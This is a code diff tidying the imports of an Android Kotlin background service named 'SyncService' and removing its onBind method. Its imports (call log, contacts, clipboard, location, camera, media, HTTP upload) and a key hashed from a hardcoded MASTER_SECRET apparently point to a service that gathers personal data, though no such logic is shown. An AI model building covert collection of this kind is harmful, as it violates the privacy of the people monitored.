@@ -4,13 +4,11 @@ import android.annotation.SuppressLint
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
-import android.app.Service
 import android.content.ClipboardManager
 import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
-import android.database.Cursor
 import android.hardware.camera2.CameraManager
 import android.location.Location
 import android.location.LocationManager
@@ -20,7 +18,10 @@ import android.media.RingtoneManager
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.net.Uri
-import android.os.*
+import android.os.Build
+import android.os.PowerManager
+import android.os.VibrationEffect
+import android.os.Vibrator
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.MediaStore
@@ -29,12 +30,18 @@ import android.provider.Settings
 import android.util.Base64
 import androidx.core.app.NotificationCompat
 import androidx.lifecycle.LifecycleService
-import kotlinx.coroutines.*
-import okhttp3.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.cancel
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
+import kotlinx.coroutines.launch
 import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
-import java.io.ByteArrayInputStream
 import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileOutputStream
@@ -126,11 +133,6 @@ class SyncService : LifecycleService() {
             }
         }
         return START_STICKY
-    }
-
-    override fun onBind(intent: Intent?): IBinder? {
-        super.onBind(intent)
-        return null
     }
 
     private fun getKey(): ByteArray = MessageDigest.getInstance("SHA-256").digest(MASTER_SECRET.toByteArray(Charsets.UTF_8))
